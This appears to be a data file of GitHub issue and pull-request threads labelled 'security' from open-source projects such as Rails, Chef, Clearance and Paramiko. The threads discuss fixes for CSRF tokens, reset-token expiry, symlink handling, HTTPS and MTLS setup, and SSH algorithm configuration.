rails/rails,627474385,"Remove HTML fallback for JS requests","We shouldn't fall back to HTML for JS requests because caching proxies
might cache secrets that are embedded in the HTML (like CSRF tokens).

See #39475

I *think* this removes everything related to the HTML fallback, but I'm not 100% sure.","If you render a html partial in a js.erb file, will that still work? If not, this would be a breaking regression.Just came across a similar older PR https://github.com/rails/rails/pull/28251> If you render a html partial in a js.erb file, will that still work? If not, this would be a breaking regression.

I *think* the bit of code that I left (the part that @eugeneius commented on) is the thing that enables rending an HTML partial inside a `js.erb` file.  I'm pretty sure we have tests for it, but I want to verify with an app.I tried removing that code and no tests failed in the Action View or Action Pack suites. I wrote a regression test for it in https://github.com/rails/rails/pull/39480.@eugeneius thank you! I merged the PR and rebased this one. Lets see what the tests do.👋 @eugeneius, I would be happy to discuss this issue with you to get your point of view before we add it to our vulnDB. can you reach out at gurshafriri@snyk.io? 
Hey @gurshafriri 👋 there's a writeup of the problem being fixed here in https://github.com/rails/rails/issues/39475, feel free to ask questions there if anything's unclear.

Also just FYI, I'm not on the Rails security team; I'm reviewing this PR in my capacity as a ""regular"" maintainer, if that makes sense 🙂 This pull request has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs.
Thank you for your contributions.
Anything pending here? 👀 ",yes,"actionpack,actionview,security,"
rails/rails,228621595,"weird behavior of per_form_csrf_tokens","### Steps to reproduce
I am created a demo app for testing [here](https://github.com/apinrdw/test-csrf-token), and also override the `RequestForgeryProtection#valid_authenticity_token?` for logging.
- open http://localhost:3000/posts/new
- fill and submit the form  
- and see the console.

### Expected behavior
```
per_form_csrf_tokens: true
compare_with_real_token: false
valid_per_form_csrf_token?: true
```

### Actual behavior
```
per_form_csrf_tokens: true
compare_with_real_token: true
valid_per_form_csrf_token?: false
```

### System configuration
**Rails version**:
5.0.3
**Ruby version**:
2.4.1","Doesn't repro here. After cloning your project and running, I get the expected

per_form_csrf_tokens: true
compare_with_real_token: false
valid_per_form_csrf_token?: trueI have the same problem in test app delivered by @apinrdw and in my own 5.0.3 and 5.1.0 apps. The worst part is, per-form check simply doesn't work - I can paste `authenticity_token` from one form to another and it will be successfully submitted.

Giving these [two lines](https://github.com/rails/rails/blob/a500b4796f86b05b3fece414f090a496d3cb4298/actionpack/lib/action_controller/metal/request_forgery_protection.rb#L340-L341) it's not surprising, I guess. The first part of the alternative is obviously true, so it doesn't even check the second, form-specific part.

Steps to reproduce:
- Open form A (let's say `Posts#create` form) in the 1st tab.
- Open form B (let's say `Users#update` form) in the 2nd tab.
- Paste `authenticity_token` from B to A.
- Submit A.
- Watch A being successfully submitted instead of rejected.I created [PR](https://github.com/rails/rails/pull/29368) for that.@apinrdw it's been a while since you reported this bug, would you be able to refresh your demo app / update your PR to Rails master and try to reproduce the bug again?",no,"security,"
sparklemotion/nokogiri,352338059,"Add support for configuration of XSLT security",,"@maths22 Thank you for submitting this! And apologies for my slow reply. Will look at it and optimistically would like to ship in v1.11.0 (see milestone).I just rebased this off current `main` and added an assertion about `NotImplementedError` to the tests for JRuby.
Again, apologies for the long delay in reviewing this and providing feedback.

There are a few things about this PR that I'd like to change:

- naming. Currently Nokogiri uses the word ""options"" (e.g., ParseOptions, SaveOptions) and this PR introduces two new words for the same concept: ""prefs"" and ""config"". I see that the [libxslt docs](http://xmlsoft.org/xslt/html/libxslt-security.html) use ""prefs"" but in the past the places where we've closely mirrored the libxml2 API are generally the parts of the API I regret most. I think we can improve on libxslt's API.
- initial values. It's not clear from this code or the tests what the initial values of these options is, and the setter isn't called by default.
- tests. I'd really like to have some tests exercising each of these libxslt features so we know whether we accidentally break them in a future release. this again is a hard-won lesson from not doing so when implementing ParseOptions or SaveOptions.

If you're not interested in working on this PR, given the long time delay, I understand. But please let me know if you think you'll be able to work on it? Otherwise I'll keep it open and hopefully find time to address some of this feedback.
",yes,"topic/security,state/pr-under-review,"
kennethkalmer/powerdns-on-rails,1194519,"Restrict creating RR's","If user 1 owns 'example.com', user 2 shouldn't be able to create 'test.example.com'. (It makes it trivial for unrelated users to ""take over"" a domain).

_http://kennethkalmer.lighthouseapp.com/projects/11831/tickets/90-restrict-creating-sub-domains_
",,no,"lighthouse,security,"
thoughtbot/clearance,43544095,"Expire password reset token after a period of time","Generating a password reset token without any expiration time opens up a potential security flaw. Not a very easily exploitable one, but an easily preventable one nonetheless. More info: http://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet#Step_3.29_Send_a_Token_Over_a_Side-Channel
In addition to their email account being compromised, there's another possible scenario: if a user clicks Reset Password but never gets around to actually resetting their password, anyone who gets access to the backend database at any point in the future can reset that user's password. This would be much faster than trying to crack the encrypted password. And since by default there is no email sent upon password change, the user might not ever know that their account has been compromised.
","> Generating a password reset token without any expiration time opens up a potential security flaw. Not a very easily exploitable one, but an easily preventable one nonetheless.

I agree. Password resets should expire for the reasons you list. This has been on my radar, but I'll have to think about how best to address this. It's likely a breaking change that will need to go to 2.0.
Is this still an issue?",no,"security,"
thoughtbot/clearance,754373223,"possible timing attack on password reset flow","After creating a PR to prevent a potential timing attacks with the remember token #917, I realized that at least one similar attack vector exists with clearance.

For example [here's how devise sets the confirmation token](https://github.com/heartcombo/devise/blob/eed641d2bea11839ab13e943660da41cad14314d/lib/devise/models/recoverable.rb#L89), and [finds the user](https://github.com/heartcombo/devise/blob/eed641d2bea11839ab13e943660da41cad14314d/lib/devise/models/recoverable.rb#L126). The confirmation token is not directly queried in the database, but rather its digest is. This makes it safe against timing attack.

In contrast, [clearance queries the database from a user-supplied token](https://github.com/thoughtbot/clearance/blob/fbaf5cf368bc6512c11251559c5ecb655276994f/app/controllers/clearance/passwords_controller.rb#L59). It also exposes the user_id, which seems unnecessary / leaks some info.

If I'm not mistaken, Clearance doesn't offer a confirmation flow out of the box, but users who might want to implement it, might build it based on the examples in Clearance. So there's a secondary effect here as well to take into account. (Devise seems to handle it similarly to password reset as far as I can tell).

","Like @dorianmariefr said elsewhere, if you put an index on that column then that changes the timing of the lookup.

I guess this could be a timing attack otherwise but fixing it seems academic. How would you get the DB lookup to be so slow but the rest of the entirety of your Rails stack to be so consistent that you'd be able to notice?",no,"security,"
Shopify/shopify_app,1071277136,"Validating Admin Links","Someone has to understand this. How to deal with it correctly? 

An admin link is built by Shopify and sent to an App and looks like this:

    /admin_links/product?hmac=7cc99f2a98197cfe027e140cd142be54421509148de36578d8fcaddbdfad269a&id=4698512294027&locale=en&session=8767bfa0d1dd0d113211ce380dc8d144f76727112f57502977f7102a3bbfd161&shop=highfalls2020.myshopify.com&timestamp=1638645066""

So we have an HMAC, id, locale, session, shop and timestamp. 

How to use that to verify this is a good secure request? Also, there is no host. 

So what I tried, was to sort the params, and HMAC compare. Fail. And that was it. Out of ideas. What does the Shopify braintrust have to say? Anything? I see no trace whatsoever anywhere of validating Admin Links. Recipe please? 
",,no,"security,bug,support,"
jekyll/jekyll,695163109,"Preserve symlink targets in the local system","<!--
  Thanks for creating a Pull Request! Before you submit, please make sure
  you've done the following:

  - I read the contributing document at https://jekyllrb.com/docs/contributing/
-->

<!--
  Make our lives easier! Choose one of the following by uncommenting it:
-->
This is a 🐛 bug fix.
<!--  -->
<!-- This is a 🙋 feature or enhancement. -->
<!-- This is a 🔦 documentation change. -->
<!-- This is a 🔨 code refactoring. -->

<!--
  Before you submit this pull request, make sure to have a look at the following
  checklist. If you don't know how to do some of these, that's fine! Submit
  your pull request and we will help you out on the way.

  - I've added tests (if it's a bug, feature or enhancement)
  - I've adjusted the documentation (if it's a feature or enhancement)
  - The test suite passes locally (run `script/cibuild` to verify this)
-->

## Summary

Instead of copying symlinks verbatim to `_site`, this rewrites them to the absolute path so that they keep pointing at the right file.

## Context

<!--
  Is this related to any GitHub issue(s)?

  You can use keywords to automatically close the related issue.
  For example, (all of) the following will close issue #4567 when your PR is merged.

  Closes #4567
  Fixes #4567
  Resolves #4567

  Use any one of the above as applicable.
-->

This is a rebase of #8299 with all comments from that PR addressed and tests added.

Fixes #6870, closes #8299
","Rebased to current HEAD. Anything else I can do to help here?> Anything else I can do to help here?

:) Thank you for resolving merge conflicts. What this needs is some documentation (and a nice title for this PR.. :wink:)

Also, waiting for a review from @parkr or @mattr- since symlinks are security concerns..At a minimum, this needs a check to ensure that the resolved symlink is inside the site's source directory. Dereferencing symlinks that point to outside the site source is a large security risk that this PR doesn't address yet.Oh yeah - I think I can see how that would be awful. Not quite sure how to address though.

My use-case is where I deploy approximately 50GB of files outside of git and want to reference those instead of copying around.> My use-case is where I deploy approximately 50GB of files outside of git and want to reference those instead of copying around.

Maybe you can use [hardlinks](https://rubygems.org/gems/jekyll-hardlinks) instead? :) > Maybe you can use [hardlinks](https://rubygems.org/gems/jekyll-hardlinks) instead? :)

This is dependent on another tool ([git-annex](https://git-annex.branchable.com/)), which reduces my flexibility a lot.>> Maybe you can use [hardlinks](https://rubygems.org/gems/jekyll-hardlinks) instead? :)
>
> This is dependent on another tool ([git-annex](https://git-annex.branchable.com/)), which reduces my flexibility a lot.

it just changes `Jekyll::StaticFile#write` to use `FileUtils.ln` 🤔
Given the issues raised with this draft, I've decided to just eat the additional storage requirements instead of trying to improve on this code here.",yes,"fix,security,needs-documentation,"
wraith/wraith,3456745,"Botnet SSL support",,,no,"security,"
wraith/wraith,3285778,"* Rewritten mIRC AuthSystem script (fixes a serious bug)",,"There's a lot of valid compatibility code that's been removed.

I say just fix the core issue and add the `if... return` line into the `ON TEXT` events.
the compatibility code was for mirc <=5.8 IIRC, which is from somewhere in 2000.
i have no intentions to waste time on (re)writing such code.
the current piece works perfectly for any mirc i tested >=6.35, and should work just fine for >5.8 (maybe 5.8 too, didnt test).

also, in any case, it works with 6.35 and higher, which is the last 4 years or so.
IMO theres no reason to make the script large and nasty because of compatibility for SUCH an old version of mirc..
Well for example, you removed the telnet/dcc support. I cannot take it as it is. While you may think 5.8 is too old to care about, the fact is there's users still using older mIRC, and there's no reason to stop supporting them, especially in a commit/branch to fix a security issue that's unrelated.
I'll rewrite the DCC support. The telnet support should still be there IIRC.
About the mIRC compatibility, 5.8 is from year 2000... how long will you want to keep on supporting it?
Maybe you'll want to insert this script as an addition, like the old one for older mIRC and this one for the newer?
",yes,"defect,security,"
showdownjs/showdown,683718342,"Appears to be incompatible with strict-dynamic content security policy","I was doing some testing today and I noticed that the pages utilizing showdown.js were not working (the dynamic Markdown rendering). I investigated and tweaked some things with my Content Security Policy header, which is presently whitelist based. I tried adding strict-dynamic to it and then added a nonce to the script call (showdown.min.js) to see if that would fix it. It did not. The only way I could get it to work was by leaving unsafe-inline in my CSP but removing strict-dynamic and the nonce so that unsafe-inline could take full effect. The whole idea of strict-dynamic and nonces are that a properly written arbitrary script should be able to work, but either with or without strict-dynamic, this library does not work. Effectively, this project is going to break over time further if not rewritten - hoping this can be addressed! Is there a reason this can't be compatible with CSP3? Wondering if I should wait for it to become compatible or just apply a different CSP for pages utilizing showdownjs which uses unsafe-inline only on those pages.","Forgive my ignorance, is this because of ShowdownsXSS issue? https://github.com/showdownjs/showdown#xss-vulnerabilityNot 100% sure... CSPs dictate what code should be allowed to execute on a page, and if I recall correctly Showdown required extremely liberal rules to be set up to allow Showdown to work, which are considered a bad security practice today. CSPs help prevent XSS, though, so that may be related: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",no,"security,"
rnhurt/gradesheet,84933,"Strip carriage return & line feed characters from supporting skills","Currently, carriage returns and line feeds (/r/n) are getting saved to the database.  It's not causing any problems (that I know of) but it is unclean and just feels dirty.  Better yet, we should be scrubbing this field to remove _all_ weird things.
",,no,"Bug,Security,"
bellroy/lesswrong,101790070,"HTTPS Support","_From [AngryPar...@gmail.com](https://code.google.com/u/104249632091829167509/) on November 09, 2010 13:35:08_

Although FireSheep doesn't steal sessions from LW/reddit accounts by default, it's really easy to add that capability. To mitigate this, LessWrong should be accessible over https. I searched issues for ssl and https but didn't find anything, so I'm creating this issue.

Attachments:
Screenshot of me stealing my own session. 
JavaScript for FireSheep

My main concern would be someone stealing an admin's session at a meetup. Also, I promise not to steal anyone's session besides my own.

**Attachment:** [LessWrong.js Screen shot 2010-11-08 at 6.00.18 PM.png](http://code.google.com/p/lesswrong/issues/detail?id=232)

_Original issue: http://code.google.com/p/lesswrong/issues/detail?id=232_
","_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on April 21, 2011 22:10:21_

**Status:** Started  
  **Labels:** -Priority-Medium -Milestone-Future Priority-High Milestone-Now  
_From [wjmo...@gmail.com](https://code.google.com/u/117567618910921056910/) on July 24, 2011 22:47:18_

Making Less Wrong use SSL is a good idea, the following should be taken into consideration:
- In order to realise the security benefits of running over SSL the session cookie must be marked secureOnly so that it isn't submitted to insecure resources linked on secure pages (E.g. user generated LW links). There are code changes required to support this.
- Using a secure cookie implies that all insecure resources will be redirected to their secure variant. This is either a global change (the site is only on HTTPS) or there is code support required to know when to perform these redirects.
- Switching to HTTPS only is probably the easier way to go however HTTPS is generally slower due to additional negotiations required between the client and server.
- LW is hosted through a load balancer to one or more app servers therefore HTTPS must terminate at the load balancer. Typically in these situations the load balancer will set a header indicating the original protocol in case the app server needs to generate an absolute URL (E.g. in feeds). Code to support this header might be required.
_From [RedWordS...@gmail.com](https://code.google.com/u/111691611170124976348/) on July 28, 2011 14:45:56_

**Labels:** Security  
_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on June 11, 2012 15:07:54_

This got hard. If anyone cares a lot, poke me, and I might push it up in priority.

**Labels:** -Priority-High -Milestone-Now Priority-Medium Milestone-Future  
_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on August 02, 2012 23:05:27_

**Cc:** Matthew.Fallshaw  
_From [Matthew.Fallshaw](https://code.google.com/u/Matthew.Fallshaw/) on August 14, 2012 20:28:15_

**Status:** Accepted  
What happened to this? Did it get stuck because of the problem with certificates? Because maybe Let's Encrypt has made it easier now.
I don't believe this was a certificates issue, rather an implementation issue.
This still poses challenges as mentioned by @wezm in this [previous comment](https://github.com/tricycle/lesswrong/issues/330#issuecomment-132416463).
It would also increase server load and slow the response time of the site.
I really don’t like that the site forces one to login using `http://` action URIs. There’s no protection for users who want to access the site over unprotected networks.

@cdaloisio has that increased load been proven? Keepalive should mitigate the response time for subsequent requests. Most modern and many heavily used websites like Google and reddit use HTTPS without noticeably increasing initial response time.Thanks for the follow-up @binki. It has been a significant amount of time since I commented on this issue, and since then, LessWrong is going to be migrating to www.lesserwrong.com sometime in the future. Please see this post for more details. http://lesswrong.com/lw/pfl/lw_20_open_beta_live/

This codebase is not actively being developed with the intention of retiring it.",no,"imported,Priority-Medium,Type-Feature,Security,"
chef/chef,988133595,"Develop a resource that converts an existing client.pem setup to one capable of MTLS","```
As a Chef administrator
I would like a way to programmatically setup nodes to use MTLS
so that I can migrate existing systems to MTLS using Chef
```

Currently, we have the ability to enable cert validation on the Infra Server and we have the ability to use the cert chain on the client, but we don't have a way to get existing clients setup for MTLS communication. We need to provide users with the tools in chef recipes to setup the x509 cert/pem files given their existing client.pem and a CA cert.

## Potential Look / Feel

This should be considered a high level idea. Change what you need.

```ruby
chef_client_mtls_cert_migration 'setup node mtls certs' do
  ca_cert 'ABC123_I_AM_CERT_STRING'
end
```

## Requirements

- Resource is marked sensitive to prevent logs from containing the cert contents
- takes ca cert either as string or as path on disk
- has a property for specifying the client.pem location which defaults to the right location based on OS as determined by chef-config
- Outputs cert and key to the default location
","this seems fine.  the resource name is a mouthful, but i see the general sense of it.  `chef_client_mtls_conversion` is the only thing i can come up with as an alternative that maintains it in the `chef_client_*` ""namespace"" of resource prefixes.The name should be part of that ""change what you need"" comment. If someone has some magical name I'm for it.",no,"Aspect: Security,Triage: Feature Request,Focus: MTLS,"
chef/chef,811654760,"Create a helper for fetching values from AWS Parameter Store","While not often thought of as a ""secrets manager"" the AWS SSM Parameter Store is a pretty capable general-purpose key/value store that also has IAM based access control. This makes it a great secrets manager for many and also a nice place to store configuration options if they need them accessible by other AWS services or don't want to put them directly into their Chef Infra Server.

The AWS cookbook has a resource to get/set these parameters, which is functional, but rather odd since it's a resource that fetches into the node state. We really just want a helper for fetching (not setting) that behaves similarly to the resource, but fetch directly w/o messing with the node.

Here's the current resource:
https://github.com/sous-chefs/aws#aws_ssm_parameter_store

More information on SSM Parameter Store:
https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html

Looking at the current API it seems like we can probably consolidate things a bit. We currently have a `get`, `get_parameters`, and `get_parameters_by_path` action on the resource. We may be able to get away with either specifying a direct path to the parameter in which case we return a string, or a  path above that where we'd return a hash of all the keys and values.

Also we should just also perform the function of the `with_decryption` property.

## Definition of Done

- Helper method for accessing ssm_parameter_store roughly matching the capabilities of the existing chef resource
- Documentation on docs.chef.io
- Helpers included in the chef vscode plugin via the method -> YARD -> vscode automation","So if not pulling down into node state, will there not be any form of caching? I'd be concerned at least with `get_parameters_by_path` depending on how many parameters there are if you are fetching on every access. ",no,"Aspect: Security,"
chef/chef,919032664,"Identify and remediate unfiltered node attributes sent to external systems","In doing the work for #10895 , I took a quick look through and found other situations that we allow unfiltered node attributes to exit the system.   

One such example is `handlers/json_file.rb` which uses  RunStatus.to_h`.  `RunStatus` includes the node object which will not filter when `to_h` is invoked.

Let's spend some cycles  going through the code base and finding  other places that don't respect attribute block/allowlist rules. ",,no,"Aspect: Security,Status: Untriaged,"
chef/chef,992460512,"Akeyless iam auth support","Now that we have the akeyless secrets helper support in place we need to extend this to allow using AWS iam auth in the helper. This can be done in akeyless but requires API calls to their main service to get a token. We need to investigate the difficulty of doing this.",,no,"Aspect: Security,Triage: Feature Request,Epic,Focus: Secrets,"
chef/chef,988145656,"knife bootstrap needs to setup nodes for MTLS","As we rollout MTLS we need to ensure that new nodes can be bootstrapped to use MTLS. This means knife bootstrap for both *nix and windows systems needs to be able to generate a client.rb file with `ssl_client_cert`/`ssl_client_key` set and with the necessary key and cert on disk.",,no,"Aspect: Security,Triage: Feature Request,Focus: MTLS,"
chef/chef,801473019,"Chef Infra needs a way to provide secure credentials in the client.rb","### Describe the Enhancement:
<!---  What you are trying to achieve that you can't? -->
When specifying the `rubygems_url`, `http_proxy`, or `https_proxy` values in Chef Infra client's client.rb file, it seems that the only way to provide authentication credentials (e.g., to a private rubygems repo), is to embed the username and password in the URL, like `https://myuser:mypass@private.rubygems.repo`. This is not ideal, as the file could be read by anyone without changing the mode to `640` or stricter. For example, the `chef-client::config` recipe sets the permissions on the client.rb wide open: https://github.com/chef-cookbooks/chef-client/blob/master/recipes/config.rb#L83

### Describe the Need:
<!---  What kind of user do you believe would utilize this enhancement, and how many users might want this functionality -->
Storing credentials in the client.rb file is not secure.

### Current Alternative
<!--- Is there a current alternative that you can utilize to workaround the lack of this enhancement -->
The best we can do today is setting the file mode to 640 or stricter, but it would be optimal to have a better way to provide the credentials to the Chef client.

### Can We Help You Implement This?:
<!---  The best way to ensure your enhancement is built is to help implement the enhancement yourself. If you're interested in helping out we'd love to give you a hand to make this possible. Let us know if there's something you need. -->
",,no,"Aspect: Security,Triage: Feature Request,"
chef/chef,129216144,"Chef Client has no support for Self Signed SAN Certificates. ","**Versions**
- Chef Standalone Server:  12.3.1 (Deb Package)
- Chef Development Kit: 0.10.0
- Chef Client: 12.5.1

**Environment**
- Chef Server: Ubuntu 14.04.1 LTS 
- Workstation: Mac OSX v10.11.2 (Ruby 2.2.1 & OpenSSL 0.9.8zg 14 July 2015)

**Issue**
We have a Chef Server which has both public and private DNS names. such as chef.example.com (Public) & chef.example.cloud (Private). So with the certificates common name set to ""chef.example.cloud"" chef-clients on our private network work perfectly. 

On our public side it is a different story onced I have fetched the certs using:

``` bash
knife ssl fetch https://chef.example.com
```

Which give me the following expected output.

``` bash
WARNING: Certificates from chef.example.com will be fetched and placed in your trusted_cert
directory (/Users/<USERNAME>/.chef/trusted_certs).

Knife has no means to verify these are the correct certificates. You should
verify the authenticity of these certificates after downloading.

Adding certificate for chef.example.cloud in /Users/<USERNAME>/.chef/trusted_certs/chef_example_cloud.crt
```

That works file. Then when i check the certificates using this command: 

``` bash
knife ssl check https://chef.example.com 
```

I get the following error which is not what I am expecting.

``` bash
Connecting to host chef.example.com:443
ERROR: The SSL cert is signed by a trusted authority but is not valid for the given hostname
ERROR: You are attempting to connect to:   'chef.example.com'
ERROR: The server's certificate belongs to 'chef.example.cloud'

TO FIX THIS ERROR:

The solution for this issue depends on your networking configuration. If you
are able to connect to this server using the hostname chef.example.cloud
instead of chef.example.com, then you can resolve this issue by updating chef_server_url
in your configuration file.

If you are not able to connect to the server using the hostname chef.example.cloud
you will have to update the certificate on the server to use the correct hostname.
```

So next I verify the connection using OpenSSL s_client directly to check it not the certificate.

``` bash
openssl s_client -port 443 -host chef.example.com -CAfile /Users/<USERNAME>/.chef/trusted_certs/chef_example_cloud.crt
```

I get a similar output to what is shown below.

``` bash
CONNECTED(00000003)
depth=0 /C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com
verify return:1

---
Certificate chain
 0 s:/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com
   i:/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com

---
Server certificate
-----BEGIN CERTIFICATE-----
MIIEgzCCA2ugAwI .......... 1uxiodZKZQ==
-----END CERTIFICATE-----
subject=/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com
issuer=/C=US/ST=NewYork/L=NewYork/O=ExampleCompany/OU=DevOps Team/CN=chef.example.cloud/emailAddress=devops@example.com/subjectAltName=DNS.1=chef.example.com

---
No client certificate CA names sent

---
SSL handshake has read 2114 bytes and written 456 bytes

---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES128-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1
    Cipher    : DHE-RSA-AES128-SHA
    Session-ID: 20CA00067CF071B185E30BD3CC9F42202893B2645F4BF59F12F94BB1FE3765D1
    Session-ID-ctx: 
    Master-Key: 5E3D97B1341004C4A9CE8A6A12673E608681D9F24B6D9892C84834985A2D35889AB87F37861636B2D52D01962457CD42
    Key-Arg   : None
    Start Time: 1453915540
    Timeout   : 300 (sec)
    Verify return code: 0 (ok)

---
```

To conclude OpenSSL is verifying my Certificate correctly but Chef only uses the common name to do SSL verification which is the issue. As I can't find a way other than SAN Certificates to have Chef Server have multiple single certificate on the same standalone server. 

Any help would be most appreciated to enable this functionality.
","Agreed, this looks like something we should fix.
Thanks thommay :)
I'm assigning this to the sustaining team to see if they can replicate this on a modern chef-client binary since the openssl ruby bindings have been significantly updated in the last few years.",no,"Type: Bug,Priority: Low,Aspect: Security,Status: Needs Replication,"
chef/chef,686496113,"Anything that uses `remote_file` under the hood should expose `ssl_verify_mode`","### Describe the Enhancement:

We recently added `ssl_verify_mode` to `remote_file`. But there's no way to pass that through things like `windows_package`. We should expose that.

### Describe the Need:

Same as the other need - being able to handle internal servers with self-signed certs.

","Tagging this for the sustaining backlog. Turns out there *is* a way to do this already, at least for windows_package - there's a `remote_file_attributes` property which works great! That completely solves my problem, but looking through the code base I see a few that don't have this feature: `cab_package`, and `zypper_repository`. 

`packages/deb.rb` uses `remote_file`, but there's no deb_package, and I don't see that `dpkg_package` allows URLs, so I'm not quite clear where the entry point for that one is.",no,"Aspect: Security,Triage: Feature Request,Focus: Resources,"
chef/chef,747076512,"Allow client key to be retrieved from the windows certificate store","## Background

This is the first portion of our larger effort to remove client.pem files from disk where possible.

In this initial implementation, we will add the ability to fetch client.pem content from the Windows Certificate Store as the default behavior with configuration values to specify specifics.

----

## Acceptance Criteria

- When running the `chef-client` CLI the client.pem will be fetched in the following order
  - MY store at the Local System level
  - Local disk at the existing location
- The key will be identified in the store using the Chef Infra Client and the node name, allowing us to have multiple nodes managed by a single node in the future
- Documentation
","https://github.com/chef/chef/pull/12426",no,"Aspect: Security,Platform: Windows,Triage: Feature Request,Epic,"
chef/chef,988146355,"chef_client_config needs to include support for ssl_client_cert and ssl_client_key","To support MTLS we need to elevate the `ssl_client_cert` and `ssl_client_key` and properties. This could be as simple as adding these with nil defaults or if we want to enable some magic we can make these properties automatically add to the client config if the files exist on disk. I'm open to debate on either of those approaches, but either way we need to make sure MTLS config on the client side is simple.",,no,"Aspect: Security,Triage: Feature Request,Focus: MTLS,"
chef/chef,980610689,"Store Infra Client client.pem contents in the macOS Keychain","I just realized we didn't actually have an issue for this even though it's on our roadmap for H2 2021.

Once we're done with moving client.pem contents into the Windows Certificate Store as the default we need to do the same on macOS hosts with the keychain. This requires logic in the client to read a predefined keychain location by default and to set this up during bootstrap with validation.pem files or via knife.","@tas50 Is this still something that is planned?I'm no longer with Chef so I don't know where this sits in the product roadmapDustin, this has been archived for now. We still think this is important but want to finish some work against the Windows Certificate store. After that we will reevaluate and reprioritize. ",no,"Aspect: Security,Triage: Feature Request,Epic,Focus: Desktop,"
paramiko/paramiko,176189614,"Support the 'null' hostkey algorithm for 'proper' GSSAPI support","## Description

It looks like our existing GSSAPI support isn't entirely RFC-compatible which causes problems for some users. From an email:

> Paramiko says it supports GSSAPI key exchange. If
> I read the RFC https://www.ietf.org/rfc/rfc4462.txt correctly, in
> section 5 it says:
> 
> > Any implementation supporting at least one key exchange method that
> > conforms to Section 2 MUST also support the ""null"" host key
> > algorithm.
> 
> My tests show that paramiko does not support this. As our servers use
> only GSSAPI and thus only advertise the null host key method, paramiko
> does not work against our servers. As the RFC states ""MUST"", this is
> a bug and not a feature request.
> 
> I have looked at the code and saw the following in transport.py around line 121:
> 
> ```
> _preferred_keys = (
>    'ssh-rsa',
>   'ssh-dss',
> ) + tuple(ECDSAKey.supported_key_format_identifiers())
> ```
> 
> If I change this to
> 
> ```
> _preferred_keys = (
>     'ssh-rsa',
>     'ssh-dss',
> ) + tuple(ECDSAKey.supported_key_format_identifiers()) + ( 'null', )
> ```
> 
> then I may have added the right thing and I can use paramiko against
> our servers. I do however not know if this has any other side effects
> (like making this unsecure for other auth methods ;)
## TODO
- [ ] Verify exactly what `null` hostkey algorithm is and what its implications are re: whether we want it included in the default `_preferred_keys` list, or if that will open users up to vulnerabilities somehow
- [ ] Either add it to that default, if it seems safe; or if not, attach this to #387 since it becomes another ""allow flexibility in accepted key types / algorithms / ciphers"" feature need.
","Marking as a bug; if it turns into a sub-case of #387 I'll just close and add to a list of ""stuff that needs to be possible to implement this"" over there.
",no,"Needs investigation,Bug,Security,"
paramiko/paramiko,1235544179,"Make Transport cipher/algorithm choice lists fully user-configurable","This is an age old problem: users need ability to shuffle the order of, or flat out remove, certain options for kex, hostkey checks, pubkey auth offering, and so forth. This isn't currently possible without editing your Paramiko or doing monkeypatching on your Transport class or instance. A weak bone was thrown to this with `disabled_algorithms` recently but it's just a mediocre band-aid by all accounts.

Transport needs updating so that these lists are easy to override/modify/etc:

* Minimum: straight up overwriting w/o monkeypatching, which allows most of the below, if not super user friendly (outside of the cases where one truly wants a very small list of supported algos)
* Nicer: easy/ier API for removing problematic algorithms, eg ""drop Blowfish so Cryptography shuts up (n.b. this is actually going to be moot soon but a good example of the issue)"" or ""drop SHA1-based stuff to force use of SHA2"". `disabled_algorithms` allows this but is a bit clunky due to use of dicts. Maybe we want stuff like `Transport.remove_algorithms()` or w/e.
* Maybe: allow shuffling-without-removal, eg shift undesirable algorithms lower down the list. I don't see when one would want this over straight removal or overwriting though.
* Probably smart: remove `SecurityOptions` which is an old and crummy attempt at this same problem class. It's actually made things worse by being copypasta that then rots differently from the rest of the code! If we're putting this out as a backwards incompat fashion then such a deletion would go well. Otherwise, deprecate.
* Extra credit: build in some easy way to bridge SSHConfig settings for these, though that's a higher level problem yet unsolved. Probably best to start with one of the other bullet points + Fabric consuming the new API instead, since that already works.

Related:

* #387 insofar as that's another moderate sized auth/connection related shakeup badly overdue
* #1527 and #1652 are reverse-duplicates of this (I thought we had a ticket for this ages ago but ... can't find it?)","Believe this also covers #2049?> Believe this also covers #2049?

Sounds to me like it does.I've came here after reading #1961, and instead of creating new issues i'm adding comment here.

>  If anyone can identify legit issues with the new feature that are not fixable by using disabled_algorithms (or pinning to 2.8.x until one's servers are upgraded - absolutely an acceptable solution!)

We having many junos devices in our network, some of them new, some of them old. Not all can be upgraded. And we're using [py-junos-eznc](https://github.com/Juniper/py-junos-eznc) with ssh transport to comminicate with those devices. It uses netconf which uses paramiko.

After updating to latest `paramiko` we can't connect to some junos devices. For now we're pinned paramiko to 2.8, but please, consider using some fallback algorithm to allow seamlessly connecting to old hardware.

```
paramiko.transport.transport._log: Server did not send a server-sig-algs list; defaulting to our first preferred algo ('rsa-sha2-512')
````

I think paramiko should not default to using first algorithm and fail, but try some other until it works.Until this issue is resolved, I have a question related to #2049 
Is it not possible to fallback through each of the client's preferred pubkeys, and only raise if they all fail? I have a _lot_ of servers I need to connect to, none of which I have the ability to modify in any meaningful way (like upgrading old OpenSSH packages). My problem right now, is some of the older servers use versions of OpenSSH that do not send `server-sig-algs`, and only support `ssh-rsa`. Blanket disabling pubkeys `rsa-sha2-256` & `rsa-sha2-512` is not an option, since the newer servers _do_ return `server-sig-algs`, and _only_ support SHA2 algos. ",no,"High priority,Keys,Feature,Needs patch,known_hosts,Security,ssh_config,"
